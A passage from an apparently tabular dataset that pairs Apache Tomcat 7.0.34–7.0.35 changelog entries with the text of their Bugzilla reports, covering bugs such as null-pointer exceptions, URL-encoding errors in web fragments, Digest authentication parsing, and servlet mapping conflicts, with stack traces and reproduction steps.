        at org.apache.catalina.core.ApplicationFilterConfig.registerJMX(ApplicationFilterConfig.java:421)
        at org.apache.catalina.core.ApplicationFilterConfig.initFilter(ApplicationFilterConfig.java:282)
        at org.apache.catalina.core.ApplicationFilterConfig.<init>(ApplicationFilterConfig.java:108)
        at org.apache.catalina.core.StandardContext.filterStart(StandardContext.java:4650)
        at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5306)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
        at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)
        at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)
        at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:633)
        at org.apache.catalina.startup.HostConfig.deployDescriptor(HostConfig.java:657)
        at org.apache.catalina.startup.HostConfig$DeployDescriptor.run(HostConfig.java:1637)
        at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
        at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
        at java.util.concurrent.FutureTask.run(FutureTask.java:166)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
        at java.lang.Thread.run(Thread.java:722)

Dec 12, 2012 3:59:03 PM org.apache.catalina.core.StandardContext startInternal
SEVERE: Error filterStart
Dec 12, 2012 3:59:03 PM org.apache.catalina.core.StandardContext startInternal
SEVERE: Context [] startup failed due to previous errors


What should happen?
Either - if null is not an allowed filter name, throw a IllegalArgumentException on context.addFilter(...)
Or, if it is an allowed filter name, handle null-values gracefully"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54284
Catalina|Tomcat 7.0.35 (markt)|fix|54371|Prevent exceptions when processing web fragments for unexpanded WAR files when the context path contains characters that need to be encoded in URLs such as spaces. Based on a patch by Polina Genova. (markt)|java.io.FileNotFoundException while deploying web application with white space in the context root|"Created attachment 29809 [details]
Test web application.

Hello,

The following exception is thrown during web application deploy on v. Tomcat 7.0.x including the latest Tomcat 7.0.35-dev (from trunk branch):

SEVERE: Unable to process JNDI URL [jndi:/localhost/Fragment%20Example/WEB-INF/classes/com] for annotations
java.io.FileNotFoundException: jndi:/localhost/Fragment%20Example/WEB-INF/classes/com
	at org.apache.naming.resources.DirContextURLConnection.list(DirContextURLConnection.java:465)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsJndi(ContextConfig.java:2028)
	at org.apache.catalina.startup.ContextConfig.processAnnotationsUrl(ContextConfig.java:1948)
	at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1306)
	at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:878)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:369)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5173)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:633)
	at org.apache.catalina.startup.HostConfig.deployWAR(HostConfig.java:977)
	at org.apache.catalina.startup.HostConfig$DeployWar.run(HostConfig.java:1655)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:441)
	at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:303)
	at java.util.concurrent.FutureTask.run(FutureTask.java:138)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:662)

To reproduce:
1.	Deploy the attached application, which:
1.1.	Has a white space in its name;
1.2.	Includes a web fragment;
2.	The web app extraction is disabled (through unpackWARs=""false"" Host attribute in the server.xml)
Note that the fix for Bug 54249 should be first applied (to avoid other exceptions prior the questioned one).

I would like to propose a small fix for this:
A substring start position is incorrectly calculated based on a string in decoded form (e.g. ‚Äú/Fragment Example‚Äù), while the substring itself is made on an encoded string (e.g. ‚Äú/localhost/Fragment%20Example/WEB-INF/classes/com‚Äù). The proposed fix is simply to encode the string used for the calculations. 

Thanks and best regards,
Polina"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54371
Catalina|Tomcat 7.0.35 (markt)|add|54372|Make HTTP Digest authentication header parsing tolerant of invalid headers sent by known buggy clients. (markt)|Digest Authentication fails on Safari and IE8/9|"Created attachment 29814 [details]
Log with Firefox Live HTTP Headers

Login with Safari on the Mac and on IOS with DIGEST authentication fails. Also with IE8/9 the login fails.
With Firefox and Chrome login works perfect.

I did store the password in tomcat-users.xml as plain text.
Then I did configure the realm as MD5 and stored the password as a MD5 hash of [user]:[realm]:[password].
Also then Firefox and Chrome login perfectly and Safari and IE8/9 are failing.

I did attach a log file of the headers with Firefox succeeding to login.

Thanks,

Johan Borchers"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54372
Catalina|Tomcat 7.0.35 (markt)|fix|54377|Correctly set request attributes for AccessLog in RemoteIpFilter. Patch by Violeta Georgieva. (markt)|RemoteIpFilter does not correctly set request attributes for AccessLog|"In RemoteIpFilter class, there is code that publishes the new request attributes to AccessLog (see below).

821             if (requestAttributesEnabled) {
822                 request.setAttribute(AccessLog.REMOTE_ADDR_ATTRIBUTE,
823                         request.getRemoteAddr());
824                 request.setAttribute(AccessLog.REMOTE_HOST_ATTRIBUTE,
825                         request.getRemoteHost());
826                 request.setAttribute(AccessLog.PROTOCOL_ATTRIBUTE,
827                         request.getProtocol());
828                 request.setAttribute(AccessLog.SERVER_PORT_ATTRIBUTE,
829                         Integer.valueOf(request.getServerPort()));
830             }

The problem is that the source values should come from xRequest, e.g. xRequest.getRemoteAddr() and xRequest.getRemoteHost(), etc.

As it is written above, RemoteIpFilter simply republishes the current values, and AccessLog therefore does not display the correct values."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54377
Catalina|Tomcat 7.0.35 (markt)|fix|54379|Implement support for post-construct and pre-destroy elements in web.xml. Patch by Violeta Georgieva. (markt)|Implement support for post-construct and pre-destroy elements in web.xml|"There appears to be a feature that web[-fragment].xml file can contain such elements as <post-construct> and <pre-destroy>, and they are treated as equivalents to @PostConstruct and @PreDestroy annotations being present on the classes mentioned in them.

This feature is
1. mentioned in the Java EE 6 Platform Specification, chapter ""EE.5.2.5 Annotations and Injection"" [1]
2. mentioned in chapter ""8.2.3 Assembling the descriptor from web.xml, webfragment.xml and annotations"",
see points ""k."" and ""l."" on page 81 (103/230) of servlet-3_0-mrel-spec.pdf

[1] javaee_platform-6_0-fr-spec.pdf
http://jcp.org/aboutJava/communityprocess/final/jsr316/index.html

An example can be found in Jetty wiki:
http://wiki.eclipse.org/Jetty/Feature/Annotations#Lifecycle_callbacks:_PostConstruct_PreDestroy

Searching by the tag names, I do not see any code in the current trunk that processes those XML elements."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54379
Catalina|Tomcat 7.0.35 (markt)|fix|54380|Do not try to register servlets or contexts into the mapper too early (which just caused a warning to be logged). (kkolinko)|In MapperListener.lifecycleEvent(..): check state of parent before calling registerWrapper()|"In r1429745 I added a test to trunk that test what happens if the first attempt to start a Context fails, the cause of the failure is removed, and then the context is started for the second time.

The test is TestStandardContext.testBug46243().

It runs successfully, but the following message is logged:

Jan 07, 2013 3:02:07 PM org.apache.catalina.mapper.Mapper addWrapper
SEVERE: No context found: 

This happens when the context is started for the second time. If I put a breakpoint on the line that logs the message, the stack trace is (running Tomcat trunk):

  Mapper.addWrapper(String, String, String, String, Wrapper, boolean, boolean) line: 319	
  MapperListener.registerWrapper(Wrapper) line: 417	
  MapperListener.lifecycleEvent(LifecycleEvent) line: 433	
  LifecycleSupport.fireLifecycleEvent(String, Object) line: 119	
  Tomcat$ExistingStandardWrapper(LifecycleBase).fireLifecycleEvent(String, Object) line: 90	
  Tomcat$ExistingStandardWrapper(LifecycleBase).setStateInternal(LifecycleState, Object, boolean) line: 402	
  Tomcat$ExistingStandardWrapper(LifecycleBase).start() line: 168	
  StandardContext.startInternal() line: 5009	
  StandardContext(LifecycleBase).start() line: 150	
  TestStandardContext.testBug46243() line: 109	

================================================
My understanding is the following:

1. When Tomcat starts, registration into the mapper is performed by StandardService.startInternal().
Stack trace:
  Mapper.addHost(String, String[], Host) line: 89	
  MapperListener.registerHost(Host) line: 287	
  MapperListener.startInternal() line: 107	
  MapperListener(LifecycleBase).start() line: 150	
  StandardService.startInternal() line: 450	
  StandardService(LifecycleBase).start() line: 150	
  StandardServer.startInternal() line: 745	
  StandardServer(LifecycleBase).start() line: 150	
  TomcatBaseTest$TomcatWithFastSessionIDs(Tomcat).start() line: 326	
  TomcatBaseTest$TomcatWithFastSessionIDs.start() line: 421	
  TestStandardContext.testBug46243() line: 89	

2. The Context that failed to start is skipped by MapperListener.registerHost(), thanks to getState().isAvailable() check there.

3. The Mapper.addWrapper() call (the one that prints that ""No context found"" message) happens when AFTER_START_EVENT is processed for the Wrapper. At this moment the StandardContext.startInternal() has not completed yet and thus the context has not been registered by the mapper.

4. Nothing serious happens, besides the message, because when StandardContext.startInternal() completes, the AFTER_START_EVENT for the Context is processed. This is when the Context and the Wrappers that it contains are registered.

Thus I think there should be a check either in MapperListener.lifecycleEvent() or in MapperListener.registerWrapper() that tests whether getContainer().getState().isAvailable() is true."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54380
Catalina|Tomcat 7.0.35 (markt)|fix||Fix NPE in WebappLoader.stopInternal when stop is called after a failed start. (kkolinko)|||
Catalina|Tomcat 7.0.35 (markt)|add|54381|Add support for receiving WebSocket pong messages. (markt)|Websocket StreamInbound never reports receipt of a Pong|"The tomcat websocket api now allows the send of a Ping frame by the server (as of 7.0.33), via WsOutbound, but never reports the receipt of a Pong. See StreamInbound in the onData() method...

                } else if (opCode == Constants.OPCODE_PONG) {
                    // NO-OP
                }

As the intended use of Pings is for heartbeat messages, allowing a Ping without informing the server extension of the returned Pong leaves out half the utility.

I would suggest these changes to StreamInbound as a fix...

1) In the onData() method...

                } else if (opCode == Constants.OPCODE_PONG) {
                    onPong(frame.getPayLoad());
                }

2) Add a method onPong (ByteBuffer buffer)...

    protected void onPong(ByteBuffer buffer) {
        // NO-OP
    }

...which implementations may now override to handle Pong receipt and heartbeat logic. This is necessary as onData() is marked final, so there's no alternate workaround."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54381
Catalina|Tomcat 7.0.35 (markt)|fix|54382|Fix NPE when SSI processing is enabled and an empty SSI directive is present. (markt)|Nullpointer Exception after activating SSI and loading of any html-file with a specific comment|"1. Activate SSI on Tomcat and restart Tomcat
2. create an any html-file with a comment like this ""<!--#-->"" 
3. put this html-file to the webapp folder of tomcat
4. when you now go to the html file via tomcat, you will get an Nullpointer Exception. The SSIServlet.class and other necessary SSI-classes cannot be found"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54382
Catalina|Tomcat 7.0.35 (markt)|fix||Fix ArrayIndexOutOfBoundsException in HttpParser when parsing incorrect HTTP headers. (kkolinko)|||
Catalina|Tomcat 7.0.35 (markt)|fix|54387|Deployment must fail when multiple servlets are mapped to the same url-pattern. (markt)|Having servlets with same url should at least cause warning|"I've found this interesting ""mal functioning"" in a application where I just copied the mapping portion of web.xml for a new created servlet, but forgot to change de URI.

Tomcat deployed the application without any warning, but when running the application only the last referenced servlet was working (like if the mapping of the first has been overwritten by the last in the XML file).

I made additional tests using annotations in servlets, and the behavior of having more than one servlet with same mapping causes random access to one or another (I cannot determine a predictable way).

In order to prevent breaking existing applications, I would like to have just a ""big warning"" in the log at startup and/or deployment of the application that have more than one servlet mapped to same URL.

Examples of the problem:

Example 1: Web.xml
...
  <servlet>
    <servlet-name>PrintDacteServlet</servlet-name>
    <servlet-class>br.com.simfreteV1.web.PrintDacteServlet</servlet-class>
  </servlet>
  <servlet>
    <servlet-name>CotacaoReportServlet</servlet-name>
    <servlet-class>br.com.simfreteV1.web.CotacaoReportServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>PrintDacteServlet</servlet-name>
    <url-pattern>/secure/relatorios/Action</url-pattern>
  </servlet-mapping>
  <servlet-mapping>
    <servlet-name>CotacaoReportServlet</servlet-name>
    <url-pattern>/secure/relatorios/Action</url-pattern>
  </servlet-mapping>
...


Example 2: annotations in java servlet files

@WebServlet(name = ""PdfReportPrint"", urlPatterns = {""/secure/relatorios/doReport""})
public class PdfReportPrint extends AbstractBaseServlet {
...


@WebServlet(name = ""PrintBoletoServlet"", urlPatterns = {""/secure/relatorios/doReport""})
public class PrintBoletoServlet extends HttpServlet {
..."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54387
Catalina|Tomcat 7.0.35 (markt)|fix|54391|Provide a value for the javax.servlet.context.orderedLibs attribute. (markt)|Provide value for javax.servlet.context.orderedLibs attribute|"In Servlet spec 3.0 Rev. a at the end of chapter 8.3 the following is written
(page #87 (109/230)):

[quote]
In addition, a Servlet 3.0 compliant Servlet container must provide a
ServletContext attribute with name javax.servlet.context.orderedLibs,
whose value (of type java.util.List<java.lang.String>) contains the list of
names of JAR files in the WEB-INF/lib directory of the application represented by
the ServletContext, ordered by their web fragment names (with possible
exclusions if fragment JAR files have been excluded from absolute-ordering), or
null if the application does not specify any absolute or relative ordering.
[/quote]

In the source code there is a constant ServletContext.ORDERED_LIBS, but I see no code where it were used.

My understanding is that the list should contain just the jar names, e.g. [""foo.jar"", ""bar.jar""] and be absent if there is no ordering."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54391
Coyote|Tomcat 7.0.35 (markt)|fix|54248|Ensure that byte order marks are swallowed when using a Reader to read a request body with a BOM for those encodings that require byte order marks. (markt)|Retrieving content that contains a BOM via request.getReader() issue|"If a request contains Content that includes the BOM - in my case Content-Type: application/xml; charset-utf-16 - and the content has a BOM (FF FE), when fetched utilizing the BufferedReader from getReader() - the first request serviced on the AJP thread works correctly (encoded correctly, only characters fetched), however, any subsequent request on the thread which includes the BOM has the BOM being delivered to the application. It appears via review of the Tomcat code, that the recycle() method in B2CConverter simply ensures the socket's data has been completely flushed and the underlying InputStream doesn't get reset (don't really know if there is a way to do this without re-instantiating it) to ensure subsequent requests BOM is consumed. I proved this as a test by adding a call to reset() within the recycle() method which re-instantiates the underlying InputStreams and the problem resolved itself. 

I've temporarily resolved the issue in my application code by using request.getInputStream() and using request.getCharacterEncoding() and encoding the content inside my application."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54248
Coyote|Tomcat 7.0.35 (markt)|fix||Fix release of processors in AjpNioProtocol. Wrong object was used as a key in the connections map. (kkolinko)|||
Jasper|Tomcat 7.0.35 (markt)|add|54240|Add support for auto-detection and configuration of JARs on the classpath that provide tag plug-in implementations. Based on a patch by Sheldon Shao. (markt)|Configurable system level tagPlugins.xml|"Created attachment 29687 [details]
Patch for TagPluginManager.java

Currently, tagPlugins.xml can only be put in a WAR.
However, if the configuration can be put into a web framework, so web application don't need to care about this."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54240
Jasper|Tomcat 7.0.35 (markt)|fix|54241|Revert the fix for 35410 as it was not compliant with the JSP specification, specifically that <%= obj %> must be translated to out.print(obj) which in turn becomes out.write(String.valueOf(obj)). This will trigger a NullPointerException if obj.toString() returns null. The fix for 35410 incorrectly suppressed the NullPointerException in this case. (markt)|NPE in BodyContentImpl|"Created attachment 29688 [details]
Patch for BodyContentImpl.java

Similar as BUG 35410, there is a NPE when calling BodyContentImpl#write(String) if the String is NULL."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54241
Jasper|Tomcat 7.0.35 (markt)|fix|54242|Correct handle null iterations with in the JSTL ForEach tag plug-in implementation. Patch provided by Sheldon Shao. (markt)|NPE in tagPlugins:ForEach|"Created attachment 29689 [details]
Patch for ForEach

There is not NULL pointer handling for iterator in ForEach.
If the iterator is NULL, there is a NPE."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54242
Jasper|Tomcat 7.0.35 (markt)|fix|54260|Avoid NullPointerException when using JSP unloading and tag files. (markt)|"JSP unloading - NullPointerException when using "".tag"" files"|"Since Tomcat 7.0.30 (currently using version 7.0.33) we are faced with the
following NullPointerException:

Dec 7, 2012 2:10:28 PM
org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor
processChildren
SEVERE: Exception invoking periodic operation:
java.lang.NullPointerException
        at
org.apache.jasper.util.FastRemovalDequeue$Entry.access$700(FastRemovalDe
queue.java:254)
        at
org.apache.jasper.util.FastRemovalDequeue.remove(FastRemovalDequeue.java
:177)
        at
org.apache.jasper.compiler.JspRuntimeContext.checkUnload(JspRuntimeConte
xt.java:610)
        at
org.apache.jasper.servlet.JspServlet.periodicEvent(JspServlet.java:360)
        at
org.apache.catalina.core.StandardWrapper.backgroundProcess(StandardWrapp
er.java:709)
        at
org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.proc
essChildren(ContainerBase.java:1530)
        at
org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.proc
essChildren(ContainerBase.java:1540)
        at
org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.proc
essChildren(ContainerBase.java:1540)
        at
org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.proc
essChildren(ContainerBase.java:1540)
        at
org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.run(
ContainerBase.java:1519)
        at java.lang.Thread.run(Thread.java:662)



Investigation results:

I was able to debug and trace the exception and found that the Excpetion
is caused by a '.tag', I'm including in my JSP, which has no
UnloadHandle assigned when processed in
org.apache.jasper.compiler.JspRuntimeContext.checkUnload() line 610:
jspQueue.remove(jsw.getUnloadHandle());

Because jsw.getUnloadHandle() returns null, jspQueue.remove() fails and
is throwing the NullPointerException everytime, aborting the ""unload"".



Reproducing the exceptiopn:

It looks like the exception appears only when ""maxLoadedJsps"" and "" jspIdleTimeout"" are set to a value >0 in tomcat/conf/web.xml and "".tag"" files are used with jsp-scriptlets.

Web.xml changes:
        <init-param>
            <param-name>maxLoadedJsps</param-name>
            <param-value>1000</param-value>
        </init-param>
        <init-param>
            <param-name>jspIdleTimeout</param-name>
            <param-value>5</param-value>
        </init-param>


The exception can be observed in the example ""Tag Files"" -> ""Display Products Example"" but you have to edit the WEB-INF/tags/displayProducts.tag and append the following example scriptlet:

<%
 String test = ""this is ="";
 if (normalPrice != null)
  test = test + normalPrice + "" something"";
 else
  test = test + onSale + ""="";
 StringBuilder tags=new StringBuilder(test);
 tags.append(""."").append(test).append(""...""); // change here
 test = tags.toString();
 request.setAttribute(""test"", test);
%>
<%=test %>

Start Tomcat and invoke the example jsp http://localhost:8080/examples/jsp/jsp2/tagfiles/products.jsp

Wait and observe the catalina.out (or tomcat output) for exceptions. Normaly the exception won't appear. Now edit the previously added scriplet in WEB-INF/tags/displayProducts.tag modifying any string in one of the append statements.
Call the example jsp again, tomcat should recompile the tag, wait and observe again your tomcat output.
Do not shutdown or restart tomcat between these steps! Tomcat should recompile the tag on the fly.

We were able to reproduce the exception on Tomcat 7.0.30, 7.0.32 and 7.0.33 on different machines using the described steps."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54260
Jasper|Tomcat 7.0.35 (markt)|fix|54370|Improve handling of nulls when trying to match sets of parameters to a method in EL. (markt)|NPE mapping method in EL|"Created attachment 29808 [details]
Patch

NPE when using null parameters in some cases: https://issues.jboss.org/browse/AS7-3177

I did put a workaround for it, but I don't know how legitimate it is. It looks a bit similar to the NPE with a null toString that got reverted, where a null object is used as an argument."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54370
Jasper|Tomcat 7.0.35 (markt)|fix|54338|Correctly coerce the value to the expected type when using the tag plug-in for the JSTL set tag. Patch provided by Sheldon Shao. (markt)|Class cast exception in tagPlugin Set generated code|"Created attachment 29786 [details]
Test case for ""Set""

It uses ""Class.cast"" to convert an object to a given class in the code generated by tagPlugin ""Set"".

It causes an exception when the value is primitive type,
Here is a sample,

Caused by: java.lang.ClassCastException: Cannot cast class java.lang.Integer to int
        at java.lang.Class.cast(Class.java:1711)
        at org.apache.jsp.WEB_002dINF.views.error_jsp._jspService(error_jsp.java:108)
        at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:668)
        at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:432)
        ... 52 more


The correct way is to use ""ELSupport.coerceToType"".
Attached a patch and test case for this issue."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54338
Web applications|Tomcat 7.0.35 (markt)|fix|54244|Clarify the documentation for the BIO and NIO SSL configuration attributes sslEnabledProtocols and sslProtocol within the documentation web application. (markt)|HTTP Connector SSL support section should give examples for sslEnabledProtocols and sslProtocol|"Neither of these two configuration attributes have any examples for valid values except for sslProtocol which specifies ""TLS"" as the default.

Also, it is unclear what the difference between these two attributes is: does setting the sslProtocol enable just a single protocol?

One of these attributes likely takes a value like SSLv2, SSLv3, TLSv1, etc. or maybe SSLv3+TLSv1 but it's not clear which one (or both).

Even if the list of valid values is JVM-specific (e.g. not every JVM supports TLSv1.2), some examples should be given."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54244
Web applications|Tomcat 7.0.35 (markt)|add||Integrate documentation of Tomcat 7 with Apache Comments System. People can leave their comments when reading documentation online at the tomcat.apache.org site. (rjung)|||http://tomcat.apache.org/
Other|Tomcat 7.0.35 (markt)|fix|54390|Use 'java_home' on Mac OS X to auto-detect JAVA_HOME. (schultz)|Use 'java_home' on Mac OS X to auto-detect JAVA_HOME|"Installing Java 7 on OSX does not force Tomcat to use newly installed active JDK, instead it is still using the old .../CurrentJDK/Home mechanism.


Java 7 Installation on OSX does not reside on conventional location on file system , which is being used by tomcat setclasspath.sh script. 
Excerpt from setclasspath.sh

if [ -d ""/System/Library/Frameworks/JavaVM.framework/Versions/CurrentJDK/Home"" ];         
   then
   export     
  JAVA_HOME=""/System/Library/Frameworks/JavaVM.framework/Versions/CurrentJDK/Home""

Solution to the problem is to update setclasspath.sh script to ;

    if [ -d ""$(/usr/libexec/java_home)"" ]; then
      export JAVA_HOME=$(/usr/libexec/java_home)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=54390
Catalina|Tomcat 7.0.34 (markt)|fix|53871|Improve error message if annotation scanning fails during web application start due to poor configuration or illegal cyclic inheritance with the application's classes. (markt)|java.lang.StackOverflowError on deploying a web application|"When starting Tomcat 7.0.29 and 7.0.30, and automatically deploying a war file from webapps the following error is thrown:
14:01:06,380 ERROR [HostConfig:576] Error waiting for multi-thread deployment of context descriptors to complete java.util.concurrent.ExecutionException: java.lang.StackOverflowError
    at java.util.concurrent.FutureTask$Sync.innerGet(FutureTask.java:252)
    at java.util.concurrent.FutureTask.get(FutureTask.java:111)
    at org.apache.catalina.startup.HostConfig.deployDescriptors(HostConfig.java:574)
    at org.apache.catalina.startup.HostConfig.deployApps(HostConfig.java:470)
    at org.apache.catalina.startup.HostConfig.start(HostConfig.java:1413)
    at org.apache.catalina.startup.HostConfig.lifecycleEvent(HostConfig.java:313)
    at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
    at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
    at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:401)
    at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:346)
    at org.apache.catalina.core.ContainerBase.startInternal(ContainerBase.java:1140)
    at org.apache.catalina.core.StandardHost.startInternal(StandardHost.java:785)
    at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
    at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1559)
    at org.apache.catalina.core.ContainerBase$StartChild.call(ContainerBase.java:1549)
    at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
    at java.util.concurrent.FutureTask.run(FutureTask.java:166)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
    at java.lang.Thread.run(Thread.java:722)

Caused by: java.lang.StackOverflowError at java.util.HashSet.(HashSet.java:103) at org.apache.catalina.startup.ContextConfig.populateSCIsForCacheEntry(ContextConfig.java:2243) at org.apache.catalina.startup.ContextConfig.populateSCIsForCacheEntry(ContextConfig.java:2260) at org.apache.catalina.startup.ContextConfig.populateSCIsForCacheEntry(ContextConfig.java:2260)
...(and many more identical lines)...

However this works fine in 7.0.28."|https://bz.apache.org/bugzilla/show_bug.cgi?id=53871
Catalina|Tomcat 7.0.34 (markt)|fix||Fix unit test for AccessLogValve when using non-GMT time zone. (rjung)|||
Catalina|Tomcat 7.0.34 (markt)|fix|54170|Ensure correct registration of Filters and Servlets in the JMX registry if the Filter or Servlet name includes a character that must be quoted if used in an ObjectName value. (markt)|JMX ObjectName for Filters: names used without quoting (escaping)|"How to reproduce:
Execute 

context.addFilter(""deprecatedApiReporterFilterFor/myAPI/v2/*, new ArbitraryServletFilter()).addMappingForUrlPatterns(null, false, ""/myAPI/v2/*"");

from inside the contextInitialized-Method of an ServletContextListener.


What happens:
Nov 19, 2012 6:01:34 PM org.apache.catalina.core.ApplicationFilterConfig registerJMX
Information: JMX registration failed for filter of type [ArbitraryServletFilter] and name [deprecatedApiReporterFilterFor/myAPI/v2/*]
javax.management.RuntimeOperationsException
	at com.sun.jmx.mbeanserver.Repository.addMBean(Repository.java:411)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerWithRepository(DefaultMBeanServerInterceptor.java:1898)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerDynamicMBean(DefaultMBeanServerInterceptor.java:966)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerObject(DefaultMBeanServerInterceptor.java:900)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.registerMBean(DefaultMBeanServerInterceptor.java:324)
	at com.sun.jmx.mbeanserver.JmxMBeanServer.registerMBean(JmxMBeanServer.java:512)
	at org.apache.tomcat.util.modeler.Registry.registerComponent(Registry.java:742)
	at org.apache.catalina.core.ApplicationFilterConfig.registerJMX(ApplicationFilterConfig.java:432)
	at org.apache.catalina.core.ApplicationFilterConfig.initFilter(ApplicationFilterConfig.java:281)
	at org.apache.catalina.core.ApplicationFilterConfig.<init>(ApplicationFilterConfig.java:107)
	at org.apache.catalina.core.StandardContext.filterStart(StandardContext.java:4638)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5294)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
	at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:895)
	at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:871)
	at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:615)
	at org.apache.catalina.startup.HostConfig.deployDescriptor(HostConfig.java:649)
	at org.apache.catalina.startup.HostConfig$DeployDescriptor.run(HostConfig.java:1581)
	at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
	at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:334)
	at java.util.concurrent.FutureTask.run(FutureTask.java:166)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
	at java.lang.Thread.run(Thread.java:722)
Caused by: java.lang.IllegalArgumentException: Repository: cannot add mbean for pattern name Catalina:j2eeType=Filter,name=deprecatedApiReporterFilterFor/myAPI/v2/*,WebModule=//localhost/,J2EEApplication=none,J2EEServer=none
	... 24 more

Why does it happen:

Because ApplicationFilterConfig constructs the ObjectName by String concatenation, without escaping the filterName using ObjectName.quote(String s)

I was able to reproduce it using Catalina 7.0.26."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54170
Catalina|Tomcat 7.0.34 (markt)|add||Add new attribute renameOnRotate to the AccessLogValve. (rjung)|||
Catalina|Tomcat 7.0.34 (markt)|fix|54190|Correct unit tests for BASIC authentication so that session timeout is correctly tested. Also refactor unit test to make it easier to add additional tests. Patch by Brian Burch. (markt)|TestNonLoginAndBasicAuthenticator does not test session timeout properly|"Created attachment 29621 [details]
Extensive update to the test class to demonstrate session timeout properly

While working on a new test case for a different Authenticator, I decided to follow the timeout test case in this class. Although all the test cases currently run successfully, I discovered three fundamental flaws in the existing timeout test case:

1. The BasicAuthenticator does not create a session by default, so there was no session to actually timeout.
2. Context.setSessionTimeout() was called with a timeout in seconds, but this method expects a timeout argument in minutes.
3. The presence of 401 Unauthorized status was intended to confirm a session timeout, but it was erroneously succeeding because no credentials were supplied when attempting to re-access the protected resource.

The attached patch is quite extensive, but cannot easily be broken into smaller units:
1. The AuthenticatorBase.setAlwaysUseSession variable can now be manipulated by test cases.
2. The doTestBasic method has been reimplemented so that it only makes a single HTTP GET request (instead of two).
3. doTestBasic can now be controlled to authenticate or not, and it will also harvest a session cookie and can also supply that cookie in subsequent requests.
4. The doTestNonLogin method can be controlled to send a saved session cookie.
5. The erroneous timeout test case has been reimplemented has been renamed and properly commented to explain that it is not testing a timeout.
6. A new session persistence test case has been added.
7. A new session persistence timeout test case has been added.
8. Raw boolean control flags have been replaced with self-documenting constants.
9. Helpful comments have been added in some places where the logic is not self-evident.

